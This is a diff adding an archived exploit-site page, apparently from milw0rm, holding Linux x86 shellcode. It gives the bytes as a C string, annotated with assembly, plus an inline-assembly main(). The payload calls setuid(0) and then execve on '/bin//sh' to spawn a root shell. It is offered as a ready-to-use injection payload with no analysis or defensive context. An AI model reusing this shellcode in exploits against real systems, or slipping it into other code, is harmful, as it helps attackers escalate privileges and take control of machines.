@@ -1,0 +1,46 @@
+<html>
+<head>
+<title>milw0rm productions</title>
+<pre>
+/*
+s0t4ipv6@shellcode.com.ar
+20 de marzo de 2001
+
+
+&quot;\x31\xdb&quot;                      // xorl         %ebx,%ebx
+&quot;\x8d\x43\x17&quot;                  // leal         0x17(%ebx),%eax
+&quot;\xcd\x80&quot;                      // int          $0x80
+&quot;\x31\xd2&quot;                      // xorl         %edx,%edx
+&quot;\x52&quot;                          // pushl        %edx
+&quot;\x68\x6e\x2f\x73\x68&quot;          // pushl        $0x68732f6e
+&quot;\x68\x2f\x2f\x62\x69&quot;          // pushl        $0x69622f2f
+&quot;\x89\xe3&quot;                      // movl         %esp,%ebx
+&quot;\x52&quot;                          // pushl        %edx
+&quot;\x53&quot;                          // pushl        %ebx
+&quot;\x89\xe1&quot;                      // movl         %esp,%ecx
+&quot;\xb0\x0b&quot;                      // movb         $0xb,%al
+&quot;\xcd\x80&quot;;                     // int          $0x80
+
+*/
+
+void main() {
+__asm__ (&quot;
+	xorl	%ebx, %ebx
+	leal	0x17(%ebx),%eax
+	int	$0x80				# here was cleared eax
+
+	xorl	%edx, %edx
+	pushl	%edx
+	pushl	$0x68732f6e
+	pushl	$0x69622f2f
+	movl	%esp, %ebx
+	pushl	%edx
+	pushl	%ebx
+	movl	%esp, %ecx
+	movb	$0xb, %al			# and makeuof here
+	int	$0x80
+	&quot;);
+}</pre>
+//downloaded from milw0rm.com
+</html>
+
